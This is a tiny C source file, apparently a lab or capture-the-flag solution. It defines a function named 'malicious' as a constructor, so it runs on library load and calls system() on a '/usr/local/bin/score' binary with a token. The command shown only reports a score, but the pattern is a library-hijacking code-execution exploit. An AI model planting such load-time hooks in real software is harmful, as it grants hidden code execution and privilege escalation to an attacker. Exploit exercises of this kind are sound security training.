#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score b176c99b-a4f0-41d4-b125-39945b1b7348");
}
